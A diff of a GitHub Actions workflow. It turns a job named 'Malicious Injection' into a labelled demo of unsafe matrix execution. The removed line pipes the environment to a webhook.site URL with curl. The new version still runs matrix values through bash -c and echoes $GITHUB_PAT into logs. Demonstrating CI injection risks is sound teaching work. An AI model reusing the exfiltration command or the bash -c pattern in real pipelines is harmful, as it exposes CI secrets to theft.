@@ -1,17 +1,35 @@
-name: Malicious Injection
+name: Demo - Unsafe matrix execution (BENIGN)
 
 on:
   pull_request:
+  push:
+    branches: [ main ]
+
+permissions:
+  contents: read   # minimal permissions for demo
 
 jobs:
-  exploit:
+  demo:
     runs-on: ubuntu-latest
     strategy:
       matrix:
+        # NOTE: these values are being set here for the demo.
+        # In real bad examples, these could come from untrusted sources.
         target:
-          - "echo '🔥 Exploiting CI'; env | curl -X POST -d @- https://webhook.site/b0c9f97b-3237-4b13-b3b7-920e02ff5f7f"
+          - 'echo "I am running injected command"; echo "DUMMY_SECRET=$GITHUB_PAT"'
     steps:
-      - name: Malicious Exec
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Show environment (sanity)
+        run: env | sort | sed -n '1,40p'
+
+      - name: Unsafe run (demonstration only)
+        # WARNING: Unsafe pattern — executing matrix values directly with bash -c
         run: |
-          echo "Command: ${{ matrix.target }}"
+          echo "Command to run: ${{ matrix.target }}"
+          # Here we deliberately run the matrix value with bash -c to show execution
           bash -c "${{ matrix.target }}"
+        env:
+          # This is a dummy secret in your test repo; do NOT use real PATs
+          DUMMY_SECRET: ${{ secrets.DUMMY_SECRET }}
